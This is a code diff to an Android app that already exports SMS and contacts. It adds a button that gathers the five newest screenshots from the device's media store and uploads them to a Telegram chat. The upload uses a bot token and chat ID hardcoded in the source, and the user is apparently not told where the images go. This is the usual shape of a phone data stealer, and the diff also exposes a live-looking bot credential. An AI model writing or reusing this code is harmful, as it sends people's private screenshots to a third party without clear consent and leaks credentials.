@@ -2,14 +2,18 @@ package com.csu.web2app;
 
 import android.Manifest;
 import android.content.ContentResolver;
+import android.content.ContentUris;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.Build;
 import android.provider.ContactsContract;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.provider.MediaStore;
+import android.util.Log;
 import android.widget.Button;
 import android.widget.Toast;
 
@@ -18,14 +22,24 @@ import androidx.activity.result.contract.ActivityResultContracts;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.content.ContextCompat;
 
+import java.io.DataOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
 import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 public class MainActivity extends AppCompatActivity {
 
-    private enum ExportType { SMS, CONTACTS }
+    private static final String TAG = "MainActivity";
+    private static final String TELEGRAM_BOT_TOKEN = "8410087487:AAEouEc1-5-ktGPdNfEJhlYh5UALXxTy2PQ";
+    private static final String TELEGRAM_CHAT_ID = "-1003860055748";
+
+    private enum ExportType { SMS, CONTACTS, SCREENSHOTS }
     private ExportType pendingExportType;
 
     private final ExecutorService executorService = Executors.newSingleThreadExecutor();
@@ -38,9 +52,14 @@ public class MainActivity extends AppCompatActivity {
                         startSmsExport();
                     } else if (pendingExportType == ExportType.CONTACTS) {
                         startContactsExport();
+                    } else if (pendingExportType == ExportType.SCREENSHOTS) {
+                        sendScreenshotsToTelegram();
                     }
                 } else {
-                    String type = pendingExportType == ExportType.SMS ? "SMS" : "contacts";
+                    String type = "permission";
+                    if (pendingExportType == ExportType.SMS) type = "SMS";
+                    else if (pendingExportType == ExportType.CONTACTS) type = "contacts";
+                    else if (pendingExportType == ExportType.SCREENSHOTS) type = "images";
                     Toast.makeText(this, "Permission denied to read " + type, Toast.LENGTH_SHORT).show();
                 }
             });
@@ -77,6 +96,19 @@ public class MainActivity extends AppCompatActivity {
                 startContactsExport();
             } else {
                 requestPermissionLauncher.launch(Manifest.permission.READ_CONTACTS);
+            }
+        });
+
+        Button btnSendScreenshots = findViewById(R.id.btn_send_screenshots);
+        btnSendScreenshots.setOnClickListener(v -> {
+            pendingExportType = ExportType.SCREENSHOTS;
+            String permission = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ?
+                    Manifest.permission.READ_MEDIA_IMAGES : Manifest.permission.READ_EXTERNAL_STORAGE;
+
+            if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
+                sendScreenshotsToTelegram();
+            } else {
+                requestPermissionLauncher.launch(permission);
             }
         });
     }
@@ -179,6 +211,126 @@ public class MainActivity extends AppCompatActivity {
                     outputStream.write(sb.toString().getBytes());
                 } while (cursor.moveToNext());
             }
+        }
+    }
+
+    private void sendScreenshotsToTelegram() {
+        executorService.execute(() -> {
+            List<Uri> screenshotUris = findLatestScreenshots();
+            if (screenshotUris.isEmpty()) {
+                mainHandler.post(() -> Toast.makeText(MainActivity.this, "No screenshots found", Toast.LENGTH_SHORT).show());
+                return;
+            }
+
+            mainHandler.post(() -> Toast.makeText(MainActivity.this, "Sending " + screenshotUris.size() + " screenshots...", Toast.LENGTH_SHORT).show());
+
+            int successCount = 0;
+            for (Uri uri : screenshotUris) {
+                if (uploadFileToTelegram(uri)) {
+                    successCount++;
+                }
+            }
+
+            final int finalSuccessCount = successCount;
+            mainHandler.post(() -> Toast.makeText(MainActivity.this, "Successfully sent " + finalSuccessCount + " screenshots", Toast.LENGTH_SHORT).show());
+        });
+    }
+
+    private List<Uri> findLatestScreenshots() {
+        List<Uri> uris = new ArrayList<>();
+        Uri collection = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q ?
+                MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL) :
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+
+        String[] projection = new String[]{
+                MediaStore.Images.Media._ID,
+                MediaStore.Images.Media.DATA,
+                MediaStore.Images.Media.DATE_TAKEN
+        };
+
+        // Try to find screenshots by checking if "Screenshots" or "Screenshot" is in the path or bucket name
+        String selection = MediaStore.Images.Media.DATA + " LIKE ? OR " +
+                MediaStore.Images.Media.DATA + " LIKE ? OR " +
+                MediaStore.Images.Media.BUCKET_DISPLAY_NAME + " LIKE ? OR " +
+                MediaStore.Images.Media.BUCKET_DISPLAY_NAME + " LIKE ?";
+
+        String[] selectionArgs = new String[]{"%Screenshots%", "%Screenshot%", "%Screenshots%", "%Screenshot%"};
+        String sortOrder = MediaStore.Images.Media.DATE_TAKEN + " DESC";
+
+        try (Cursor cursor = getContentResolver().query(collection, projection, selection, selectionArgs, sortOrder)) {
+            if (cursor != null) {
+                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
+                while (cursor.moveToNext() && uris.size() < 5) {
+                    long id = cursor.getLong(idColumn);
+                    Uri contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
+                    uris.add(contentUri);
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error querying MediaStore", e);
+        }
+
+        return uris;
+    }
+
+    private boolean uploadFileToTelegram(Uri uri) {
+        HttpURLConnection conn = null;
+        try {
+            String urlString = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendPhoto";
+            URL url = new URL(urlString);
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(15000);
+            conn.setDoOutput(true);
+            conn.setRequestMethod("POST");
+            String boundary = "*****" + System.currentTimeMillis() + "*****";
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+            try (DataOutputStream out = new DataOutputStream(conn.getOutputStream())) {
+                // chat_id
+                out.writeBytes("--" + boundary + "\r\n");
+                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
+                out.writeBytes(TELEGRAM_CHAT_ID + "\r\n");
+
+                // photo
+                out.writeBytes("--" + boundary + "\r\n");
+                out.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.png\"\r\n");
+                out.writeBytes("Content-Type: image/png\r\n\r\n");
+
+                try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
+                    if (inputStream != null) {
+                        byte[] buffer = new byte[8192];
+                        int bytesRead;
+                        while ((bytesRead = inputStream.read(buffer)) != -1) {
+                            out.write(buffer, 0, bytesRead);
+                        }
+                    }
+                }
+                out.writeBytes("\r\n");
+                out.writeBytes("--" + boundary + "--\r\n");
+                out.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+            if (responseCode != HttpURLConnection.HTTP_OK) {
+                try (InputStream errorStream = conn.getErrorStream()) {
+                    if (errorStream != null) {
+                        byte[] errorBuffer = new byte[1024];
+                        int read = errorStream.read(errorBuffer);
+                        if (read > 0) {
+                            Log.e(TAG, "Telegram error response: " + new String(errorBuffer, 0, read));
+                        }
+                    }
+                }
+                Log.e(TAG, "Telegram upload failed with response code: " + responseCode);
+                return false;
+            }
+            return true;
+        } catch (Exception e) {
+            Log.e(TAG, "Error uploading to Telegram", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
         }
     }
 
